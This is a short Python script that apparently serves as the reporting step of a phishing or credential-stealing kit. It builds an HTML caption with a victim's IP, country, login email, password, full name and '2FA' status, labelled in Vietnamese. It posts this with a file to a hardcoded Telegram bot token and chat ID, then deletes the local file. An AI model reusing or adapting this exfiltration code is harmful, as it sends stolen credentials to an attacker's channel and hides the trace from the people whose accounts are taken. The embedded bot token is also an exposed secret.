import os

import requests


def send_file_to_telegram(api_token, chat_id, file_path, message):
    url = f"https://api.telegram.org/bot{api_token}/sendDocument"
    files = {'document': open(file_path, 'rb')}
    data = {'chat_id': chat_id, 'caption': message, 'parse_mode': 'HTML'}
    response = requests.post(url, files=files, data=data)
    if response.status_code == 200:
        print("File sent successfully!")
        os.remove(file_path)
    else:
        print("Failed to send file.")


status = '2FA'
ip = '192.178'
country = 'Vietnam'
email = 'your_email'
password = 'your_password'
fullname = 'your_fullname'
caption = "<b>" + status + "</b>\n\n<b>IP:</b> <code>" + ip + "</code>\n<b>Quốc gia:</b> <code>" + country + "</code>\n<b>Tên đăng nhập:</b> <code>" + \
    email + "</code>\n<b>Mật khẩu:</b> <code>" + password + \
    "</code>\n<b>Tên đầy đủ:</b> <code>" + fullname + "</code>"
send_file_to_telegram(
    '6528470885:AAHsL9_y2DkeXVyrl52ge8exO1H5T8bh_00', '6656772173', 'README.MD', caption)
